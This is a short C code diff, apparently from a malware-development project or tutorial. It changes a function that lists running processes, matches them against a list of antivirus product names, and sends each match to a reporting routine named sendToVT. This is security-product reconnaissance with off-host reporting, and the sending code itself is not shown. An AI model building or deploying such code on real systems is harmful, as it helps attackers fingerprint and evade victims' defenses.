@@ -118,6 +118,7 @@ void readProcListFromFile(const char* filename) {
 void enumProcs() {
   HANDLE hProcessSnap;
   PROCESSENTRY32 pe32;
+  char avInfo[4096] = "";
 
   hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   if (hProcessSnap == INVALID_HANDLE_VALUE) {
@@ -133,9 +134,6 @@ void enumProcs() {
     return;
   }
 
-
-  char avInfo[4096]; 
-
   do {
     for (int i = 0; i < process_count; i++) {
       if (_stricmp(process_list[i].process_name, pe32.szExeFile) == 0) {
@@ -145,17 +143,23 @@ void enumProcs() {
         "AVName: %s\n",
         process_list[i].process_name,
         process_list[i].description);
+        int result = sendToVT(avInfo);
+        if (result == 0) {
+          printf("AV info ok =^..^=\n");
+        } else {
+          printf("AV info nok <3()~\n");
+        }
       }
     }
   } while (Process32Next(hProcessSnap, &pe32));
 
-  int result = sendToVT(avInfo);
+  // int result = sendToVT(avInfo);
   
-  if (result == 0) {
-    printf("AV info ok =^..^=\n");
-  } else {
-    printf("AV info nok <3()~\n");
-  }
+  // if (result == 0) {
+  //   printf("AV info ok =^..^=\n");
+  // } else {
+  //   printf("AV info nok <3()~\n");
+  // }
 
   CloseHandle(hProcessSnap);
 }
